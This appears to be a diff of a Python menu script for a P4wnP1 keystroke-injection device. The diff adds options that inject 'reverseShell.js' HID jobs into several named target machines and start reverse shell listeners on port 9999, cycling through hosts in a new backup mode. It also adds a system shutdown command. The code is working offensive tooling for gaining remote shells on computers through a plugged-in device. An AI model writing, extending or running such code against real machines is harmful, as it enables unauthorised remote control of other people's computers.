@@ -428,9 +428,9 @@ def switch_menu(argument):
         64: "_WZ,192.168.1.122",
         65: "_PAL,192.168.1.123",
         66: "_WS680,192.168.1.124",
-        67: "_SIM,127.0.0.1",
-        68: "_",
-        69: "_"
+        67: "_ALL,192.168.1.XXX",
+        68: "_SIM,127.0.0.1",
+        69: "_System shutdown",
 
 }
     return switcher.get(argument, "Invalid")
@@ -2144,7 +2144,7 @@ while 1:
                     if(result==-1):
                       displayError()
                     DisplayText("","","","Starting listner ","","","")
-                    reverseShellListener.listen("0.0.0.0",9999, "WS")
+                    reverseShellListener.listen("0.0.0.0",9999, "WS", True)
                     #Popen(['nohup','reverseShellListener.listen("0.0.0.0",9999)'],preexec_fn=os.setpgrp) 
                     #Popen(['nohup','/bin/bash','/root/BeBoXGui/update.sh'],preexec_fn=os.setpgrp)
                     DisplayText("","","","Listener terminated ","","","")
@@ -2157,9 +2157,9 @@ while 1:
                     if(result==-1):
                       displayError()
                     DisplayText("","","","Starting listner ","","","")
-                    reverseShellListener.listen("0.0.0.0",9999, "WZ")
+                    reverseShellListener.listen("0.0.0.0",9999, "WZ", True)
                     DisplayText("","","","Listener terminated ","","","")
-                    time.sleep(5)				
+                    time.sleep(5)
                 if cursor == 3:
                     # run as background job P4wnP1_cli hid job command
                     DisplayText("","","","Starting script ","","","")
@@ -2168,7 +2168,7 @@ while 1:
                     if(result==-1):
                       displayError()
                     DisplayText("","","","Starting listner ","","","")
-                    reverseShellListener.listen("0.0.0.0",9999, "PAL")
+                    reverseShellListener.listen("0.0.0.0",9999, "PAL", True)
                     DisplayText("","","","Listener terminated ","","","")
                     time.sleep(5)
                 if cursor == 4:
@@ -2179,10 +2179,42 @@ while 1:
                     if(result==-1):
                       displayError()
                     DisplayText("","","","Starting listner ","","","")
-                    reverseShellListener.listen("0.0.0.0",9999, "WS680")
+                    reverseShellListener.listen("0.0.0.0",9999, "WS680", True)
                     DisplayText("","","","Listener terminated ","","","")
                     time.sleep(5)
                 if cursor == 5:
+                    # run as background job P4wnP1_cli hid job command
+                    DisplayText("","","","Starting script ","","","")
+                    cmd = "P4wnP1_cli hid job 'reverseShell.js'"
+                    result=execcmd(cmd)
+                    if(result==-1):
+                      displayError()
+                    DisplayText("","","","Starting backup WS ","","","")
+                    reverseShellListener.listen("0.0.0.0",9999, "WS", True)
+                    
+                    cmd = "P4wnP1_cli hid job 'reverseShell.js'"
+                    result=execcmd(cmd)
+                    if(result==-1):
+                      displayError()
+                    DisplayText("","","","Starting backup WZ ","","","")
+                    reverseShellListener.listen("0.0.0.0",9999, "WZ", False)
+                    
+                    cmd = "P4wnP1_cli hid job 'reverseShell.js'"
+                    result=execcmd(cmd)
+                    if(result==-1):
+                      displayError()
+                    DisplayText("","","","Starting backup PAL ","","","")
+                    reverseShellListener.listen("0.0.0.0",9999, "PAL", False)
+                    
+                    cmd = "P4wnP1_cli hid job 'reverseShell.js'"
+                    result=execcmd(cmd)
+                    if(result==-1):
+                      displayError()
+                    DisplayText("","","","Starting backup WS680 ","","","")
+                    reverseShellListener.listen("0.0.0.0",9999, "WS680", False)
+                    DisplayText("","","","Listener terminated ","","","")
+                    time.sleep(5)
+                if cursor == 6:
                     # run as background job P4wnP1_cli hid job command
                     DisplayText("","","","Starting script ","","","")
                     cmd = "P4wnP1_cli hid job 'reverseShellLapTop.js'"
@@ -2190,9 +2222,13 @@ while 1:
                     if(result==-1):
                       displayError()
                     DisplayText("","","","Starting listner ","","","")
-                    reverseShellListener.listen("0.0.0.0",9999, "SIM")
+                    reverseShellListener.listen("0.0.0.0",9999, "SIM", False)
                     DisplayText("","","","Listener terminated ","","","")
                     time.sleep(5)
+                if cursor == 7:
+                    #exit()
+                    cmd = "shutdown now"
+                    execcmd(cmd)
 
             #main menus section
             if (page == 49):
